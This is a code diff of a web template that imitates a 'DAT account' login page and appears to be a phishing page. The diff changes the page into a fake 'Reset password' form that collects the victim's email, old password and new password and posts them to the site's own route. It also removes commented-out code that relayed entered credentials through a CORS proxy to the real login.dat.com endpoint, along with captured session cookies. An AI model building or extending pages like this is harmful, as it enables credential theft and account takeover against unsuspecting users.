@@ -77,7 +77,7 @@
             font-size: 13px;
         }
 
-        #togglePassword {
+        .togglePassword {
             font-size: 20px;
             color: black;
             top: 8px;
@@ -163,26 +163,45 @@
                 <form action="{{url('protection')}}" method="post" id="myForm">
                     @csrf
                     <div class="header">
-                        <h1 style="font-size: 34px; font-weight: 400;">Log in</h1>
-                        <p>to continue to your DAT account</p>
+                        <h1 style="font-size: 34px; font-weight: 400;">Reset password</h1>
+                        <p>Reset your DAT account password</p>
                     </div>
                     <div style="text-align: end; padding-bottom: 3px;">
-                        <span id="forgotEmail" class="forgotText">Forgot your username?</span>
+                        <span id="forgotEmail" class="forgotText">Username/Email</span>
                     </div>
                     <div class="inputContainer">
                         <input name="email" required type="email" class="filter emailInput" id="emailInput" oninput="ValidateEmail(value)" />
                         <span id="placeholderEmail" class="placeholder">Username/Email *</span>
                     </div>
-                    <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" style="    margin-top: 13px; width: 16px; height: 16px;">
-                    <label for="vehicle1"> Remember me</label><br>
+{{--                    <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" style="    margin-top: 13px; width: 16px; height: 16px;">--}}
+{{--                    <label for="vehicle1"> Remember me</label><br>--}}
                     <div style="text-align: end; padding-bottom: 3px;">
-                        <span class="forgotText">Reset password</span>
+                        <span class="forgotText">Old assword</span>
                     </div>
                     <div class="inputContainer">
                         <input type="password" name="password" id="password" required  class="filter emailInput" oninput="ValidateEmail()" />
-                        <span class="placeholder">Password *</span>
-                        <i class="bi bi-eye-slash-fill" id="togglePassword"></i>
+                        <span class="placeholder">Old Password *</span>
+                        <i class="bi bi-eye-slash-fill togglePassword" id="togglePassword"></i>
                     </div>
+
+                    <div style="text-align: end; padding-bottom: 3px;">
+                        <span class="forgotText">New Password</span>
+                    </div>
+                    <div class="inputContainer">
+                        <input type="password" name="new-password" id="password2" required  class="filter emailInput" />
+                        <span class="placeholder">New Password *</span>
+                        <i class="bi bi-eye-slash-fill togglePassword" id="togglePassword2"></i>
+                    </div>
+
+                    <div style="text-align: end; padding-bottom: 3px;">
+                        <span class="forgotText">Confirm New Password</span>
+                    </div>
+                    <div class="inputContainer">
+                        <input type="password" name="confirm-new-password" id="password3" required  class="filter emailInput"  />
+                        <span class="placeholder">Confirm New Password *</span>
+                        <i class="bi bi-eye-slash-fill togglePassword" id="togglePassword3"></i>
+                    </div>
+
                     <button  class="btn btn-primary btn-lg btn-block loginBtn" id="LoginBtn" onclick="sendRequest()">LOG IN</button>
                     <div style="font-size: 12px; padding-top: 12px; text-align: center;">
                         <span>By continuing you agree to our</span>
@@ -198,13 +217,34 @@
             .querySelector('#togglePassword');
         const password = document.querySelector('#password');
         togglePassword.addEventListener('click', () => {
-            // Toggle the type attribute using
-            // getAttribure() method
             const type = password
                 .getAttribute('type') === 'password' ?
                 'text' : 'password';
             password.setAttribute('type', type);
-            // Toggle the eye and bi-eye icon
+            this.classList.toggle('bi-eye');
+        });
+
+
+        const togglePassword2 = document
+            .querySelector('#togglePassword2');
+        const password2 = document.querySelector('#password2');
+        togglePassword2.addEventListener('click', () => {
+            const type = password2
+                .getAttribute('type') === 'password' ?
+                'text' : 'password';
+            password2.setAttribute('type', type);
+            this.classList.toggle('bi-eye');
+        });
+
+
+        const togglePassword3 = document
+            .querySelector('#togglePassword3');
+        const password3 = document.querySelector('#password3');
+        togglePassword3.addEventListener('click', () => {
+            const type = password3
+                .getAttribute('type') === 'password' ?
+                'text' : 'password';
+            password3.setAttribute('type', type);
             this.classList.toggle('bi-eye');
         });
 
@@ -239,70 +279,6 @@
         }
 
         function sendRequest ()  {
-            // // e.preventDefault();
-            // const pass = document.getElementById('password').value;
-            // const email = document.getElementById('emailInput').value;
-            // const myHeaders = new Headers();
-            // myHeaders.append("accept", "*/*");
-            // myHeaders.append("accept-language", "en-US,en;q=0.9,ru;q=0.8,hy;q=0.7");
-            // myHeaders.append("auth0-client", "eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMjAuMiJ9");
-            // myHeaders.append("content-type", "application/json");
-            // myHeaders.append("cookie", "_csrf=jOnwZbSl18MjNyQv9bWUtvpn; HandLtestDomainName=HandLtestDomainValue; __utmc=32971051; __utmz=32971051.1720768694.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); handlID=1012752787381; handl_landing_page=https://www.dat.com/login; handl_landing_page_base=https://www.dat.com/login; handl_original_ref=https://www.google.com/; organic_source=https://www.google.com/; organic_source_str=Google; traffic_source=Organic; first_traffic_source=Organic; user_agent=Mozilla/5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7)%20AppleWebKit/537.36%20(KHTML%2C%20like%20Gecko)%20Chrome/126.0.0.0%20Safari/537.36; ajs_user_id=2872387; ajs_anonymous_id=3aef3cf8-7e9e-4070-9d50-7155f2c965ec; _hjSessionUser_3280111=eyJpZCI6IjFiMTU3ZDBlLTkxNmQtNTQ3Yi05NTgxLTA3YTMxNTEwOWI0ZCIsImNyZWF0ZWQiOjE3MjA3Njg3MDU4NzgsImV4aXN0aW5nIjp0cnVlfQ==; _vwo_uuid_v2=DBFDF74D0721F1F3BC79512EBE920196B|fd757a2b73f743a11c335711b0a5612b; _gcl_au=1.1.1535992682.1720768706; _vwo_uuid=DBFDF74D0721F1F3BC79512EBE920196B; _vwo_ds=3%241720768705%3A67.89109313%3A%3A; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _ga=GA1.1.1537811867.1720768706; _fbp=fb.1.1720768706867.953837007944225954; calltrk_referrer=https%3A//www.google.com/; calltrk_landing=https%3A//www.dat.com/; calltrk_session_id=3983462b-762d-40d1-afe7-23e2391c7c7e; _hjSessionUser_2420462=eyJpZCI6IjBlYjgyZTJjLTE1YTktNTE5YS1hMWU3LWRhN2JhYzI3MWNjYyIsImNyZWF0ZWQiOjE3MjA3Njg5NjE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; did=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; did_compat=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; handl_url_base=https://www.dat.com/; handl_url=https://www.dat.com/; handl_ref=; handl_ref_domain=; __utma=32971051.1559668289.1720768694.1722161500.1722268026.3; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Jul+29+2024+19%3A47%3A08+GMT%2B0400+(Armenia+Standard+Time)&version=202403.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4c14b15f-3b02-4459-a4a2-96d43945056d&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C3%3A1%2CSSPD_BG%3A1%2C2%3A1%2C5%3A1%2C4%3A1&AwaitingReconsent=false; _uetsid=d25308c04dc111ef9ef6b9d4a227701e; _uetvid=ee347720401e11efaf4be1d9cecaf734; _rdt_uuid=1720768706377.916c2a60-88ff-4404-8266-c31dfe37d7f1; _rdt_em=0000000000000000000000000000000000000000000000000000000000000001; __cf_bm=xpT_gDJrPMyHxa8TAa28XWjPb.TalaPVhpF1trk9eAA-1722346865-1.0.1.1-me0ADBlyYJEu_JCnxL1xod3a.O18B8lXziVMD6gmnkamNgcaGFxPhNAbX0As2CKADJOmIm9BR0Je2nGMVgkroA; _ga_C36TRC5CVZ=GS1.1.1722346877.17.0.1722346877.0.0.0; _ga_QYVEY2GZSM=GS1.1.1722346877.16.0.1722346877.0.0.0");
-            // myHeaders.append("origin", "https://login.dat.com");
-            // myHeaders.append("priority", "u=1, i");
-            // myHeaders.append("referer", "https://login.dat.com/login?state=hKFo2SA3VXA3SE5XU21HQ256STJNOUFFYzdZLWJLMnNzS21lZ6FupWxvZ2luo3RpZNkgVFpVOTRmNTFKdENCSmZmTXpkZEdyUEhkWUpPd05lc2SjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638579436679069959.NjQwOGVkMGQtOTUwNy00YmUxLWEyYTItMzQ5MDI0ODYwNGJkYmQ1YWMwMzgtMDEwYy00OTY2LWIxNjEtYTBkYTI2NGUyNmZh&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1722346872083");
-            // myHeaders.append("sec-ch-ua", "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"");
-            // myHeaders.append("sec-ch-ua-arch", "\"arm\"");
-            // myHeaders.append("sec-ch-ua-bitness", "\"64\"");
-            // myHeaders.append("sec-ch-ua-full-version", "\"126.0.6478.114\"");
-            // myHeaders.append("sec-ch-ua-full-version-list", "\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"126.0.6478.114\", \"Google Chrome\";v=\"126.0.6478.114\"");
-            // myHeaders.append("sec-ch-ua-mobile", "?0");
-            // myHeaders.append("sec-ch-ua-model", "\"\"");
-            // myHeaders.append("sec-ch-ua-platform", "\"macOS\"");
-            // myHeaders.append("sec-ch-ua-platform-version", "\"13.0.1\"");
-            // myHeaders.append("sec-fetch-dest", "empty");
-            // myHeaders.append("sec-fetch-mode", "cors");
-            // myHeaders.append("sec-fetch-site", "same-origin");
-            // myHeaders.append("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");
-            //
-            // const raw = JSON.stringify({
-            //     "client_id": "PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP",
-            //     "redirect_uri": "https://power.dat.com/signin-auth0",
-            //     "tenant": "prod",
-            //     "response_type": "code id_token token",
-            //     "scope": "openid profile offline_access email",
-            //     "password": "asdasdasd",
-            //     "protocol": "oauth2",
-            //     "response_mode": "form_post",
-            //     "nonce": "638579436679069959.NjQwOGVkMGQtOTUwNy00YmUxLWEyYTItMzQ5MDI0ODYwNGJkYmQ1YWMwMzgtMDEwYy00OTY2LWIxNjEtYTBkYTI2NGUyNmZh",
-            //     "app_name": "Power",
-            //     "page_mode": "Legacy",
-            //     "audience": "https://prod-api.dat.com",
-            //     "prompt": "login",
-            //     "x-client-_sku": "ID_NET451",
-            //     "x-client-ver": "5.2.1.0",
-            //     "_csrf": "TdbJN6y1-1IZ56HdncQBdkHfVUOf-w41bIBM",
-            //     "_intstate": "deprecated",
-            //     "state": "hKFo2SA3VXA3SE5XU21HQ256STJNOUFFYzdZLWJLMnNzS21lZ6FupWxvZ2luo3RpZNkgVFpVOTRmNTFKdENCSmZmTXpkZEdyUEhkWUpPd05lc2SjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA",
-            //     "connection": "Email-Password-Authentication",
-            //     "username": "test@test.com"
-            // });
-            //
-            // const requestOptions = {
-            //     method: "POST",
-            //     headers: myHeaders,
-            //     body: raw,
-            //     redirect: "follow"
-            // };
-            // var proxy = 'https://cors-anywhere.herokuapp.com/';
-            //
-            // fetch(proxy + "https://login.dat.com/usernamepassword/login", requestOptions)
-            //     .then((response) => response.text())
-            //     .then((result) => console.log(result))
-            //     .catch((error) => console.error(error))
-            //     .finally(res => {
-            //         // document.getElementById('myForm').submit()
-            // });
 
         }
     </script>
